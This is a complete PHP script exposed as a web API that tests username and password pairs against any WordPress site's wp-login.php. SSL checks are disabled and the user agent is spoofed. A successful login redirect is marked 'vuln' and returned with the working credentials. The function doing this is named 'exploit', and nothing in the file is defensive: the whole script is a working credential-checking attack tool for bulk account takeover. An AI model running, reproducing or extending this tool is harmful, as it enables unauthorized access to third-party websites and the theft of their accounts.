<?php

header('Content-type: application/json');
function exploit($url, $user, $pass)
{
	$setopt = array(
		CURLOPT_URL => $url . '/wp-login.php',
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_POSTFIELDS => "log=$user&pwd=$pass&wp-submit=LogIn&redirect_to=$url/wp-admin/",
		CURLOPT_TIMEOUT => 60,
		CURLOPT_CONNECTTIMEOUT => 60,
		CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5',
		CURLOPT_SSL_VERIFYHOST => false,
		CURLOPT_SSL_VERIFYPEER => false,
	);
	$ch = curl_init();
	curl_setopt_array($ch, $setopt);
	$exe = curl_exec($ch);
	$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $info;
}
if (!empty($_GET['site']) && !empty($_GET['user']) && !empty($_GET['pass'])) {
	$site = htmlspecialchars($_GET['site']);
	$user = htmlspecialchars($_GET['user']);
	$pass = htmlspecialchars($_GET['pass']);
	if (!preg_match('#^http(s)?://#', $site)) {
		$url = "http://" . $site;
	} else {
		$url = $site;
	}
	$exploit = exploit($url, $user, $pass);
	if ($exploit == 302) {
		$api['url'] = $url;
		$api['user'] = $user;
		$api['pass'] = $pass;
		$api['exploit'] = 'vuln';
		echo json_encode($api, JSON_PRETTY_PRINT);
	} else {
		$api['url'] = $url;
		$api['exploit'] = 'failed';
		echo json_encode($api, JSON_PRETTY_PRINT);
	}
} else if (empty($_GET['site'])) {
	echo 'Site Empty';
} else if (empty($_GET['user'])) {
	echo 'User Empty';
} else if (empty($_GET['pass'])) {
	echo 'Pass Empty';
}
